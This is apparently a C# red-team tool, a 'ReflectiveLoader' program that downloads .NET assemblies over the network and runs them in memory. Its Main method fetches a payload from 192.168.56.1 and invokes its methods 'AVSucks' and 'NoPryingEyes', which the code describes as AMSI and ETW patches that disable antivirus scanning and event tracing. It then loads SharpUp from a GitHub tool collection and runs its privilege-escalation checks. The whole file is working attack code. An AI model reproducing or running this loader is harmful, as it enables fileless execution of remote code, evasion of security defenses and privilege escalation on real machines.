using System;
using System.IO;
using System.Reflection;
using System.Net;
using System.Threading;


namespace ReflectiveLoader
{
    class Program
    {
        public static Assembly reflectionFromPath(String path)
        {

            Byte[] rawAssemblyBytes = File.ReadAllBytes(path);
            Assembly bin = Assembly.Load(rawAssemblyBytes);
            return bin;

        }

        public static Assembly reflectionFromURL(String url, int retrycount = 3, int timeoutTimer = 60, bool printText = true, bool verbose = false)
        {
            int retry = retrycount;
            int timeout = timeoutTimer;
            Byte[] rawAssemblyBytes = { };
            Assembly bin = null;
            WebClient client = new WebClient();
            //provides https capabilities to webclient.
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; //TLS 1.2
            if (printText)
            {
                Console.WriteLine("\nAttempting to download assembly from {0}: \n", url);
            }
            while (retry != 0)
            {
                try
                {
                    //will throw a HttpStatusCode.NotFound if file is not there.
                    rawAssemblyBytes = client.DownloadData(url);
                    if (verbose)
                    {
                        Console.WriteLine("assembly found! loading now...");
                        Console.WriteLine("size of assembly: " + rawAssemblyBytes.Length);
                    }
                    bin = Assembly.Load(rawAssemblyBytes);
                    return bin;
                }
                catch (WebException webExc) //handle the 404
                {
                    HttpWebResponse response = (HttpWebResponse)webExc.Response;
                    if (response.StatusCode == HttpStatusCode.NotFound) //keep retrying until either file is found or retry attempts are 0
                    {
                        Console.WriteLine("Assembly not found yet. sleeping for {0} seconds and retrying another {1} times...", timeout, retry);
                        retry--;
                        Thread.Sleep(timeout * 1000);
                    }
                }


            }
            throw new WebException("Assembly not found. Aborting...");
        }


        public static Type[] getTypes(Assembly assembly, Boolean verbose = false)
        {

            Type[] assemblyTypes = assembly.GetTypes();
            if (verbose)
            {
                Console.WriteLine("The following classes are available in {0}: ", assembly.GetName());
                foreach (Type classType in assemblyTypes)
                {
                    Console.WriteLine(classType.Name);
                }

                Console.WriteLine("==============================");
            }
            return assemblyTypes;
        }

        public static MethodInfo[] getMethodsForType(Type classType, Boolean verbose = false)
        {
            MethodInfo[] methods = classType.GetMethods();
            if (verbose)
            {
                Console.WriteLine("The available methods for {0} are: ", classType.Name);
                foreach (MethodInfo method in methods)
                {

                    Console.WriteLine(method.Name);
                    //Console.WriteLine(method.Attributes);
                }
                Console.WriteLine("==============================");
            }
            return methods;
        }



        //public static void 
        static void Main(string[] args)
        {
            try
            {
                //AVSucks();
                try
                {
                    Console.WriteLine("Waiting to reflectively load ETW/AMSI patch..");
                    Console.ReadKey();
                    Assembly evasionAssembly = reflectionFromURL(@"http://192.168.56.1/mscorelib.exe", 3, 5);
                    Type evasionProgram = getTypes(evasionAssembly)[1];
                    getMethodsForType(evasionProgram);
                    MethodInfo AVSucks = evasionProgram.GetMethod("AVSucks");
                    Console.WriteLine("Waiting to patch ETW..");
                    Console.ReadKey();
                    MethodInfo NoPryingEyes = evasionProgram.GetMethod("NoPryingEyes");
                    object init = Activator.CreateInstance(evasionProgram);
                    AVSucks.Invoke(init, null);
                    NoPryingEyes.Invoke(init, null);
                }
                catch (Exception e)
                {
                    Console.WriteLine("could not patch.. aborting");
                    return;
                }
                Assembly loadedAssembly = reflectionFromURL(@"https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/SharpUp.exe?raw=true", 3, 5);
                Type program = getTypes(loadedAssembly)[0];
                getMethodsForType(program);
                MethodInfo mainMethod = program.GetMethod("PrivescChecks");
                object initalizedProgram = Activator.CreateInstance(program);

                Console.WriteLine("Calling the {0} method from the  {1} class of the {2} assembly, let's see what happens... ", mainMethod.Name, program.Name, loadedAssembly.GetName());
                // mainMethod.Invoke(initalizedProgram, new string[] {null});
                mainMethod.Invoke(initalizedProgram, new object[] { true });
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.ReadKey();

        }
    }
}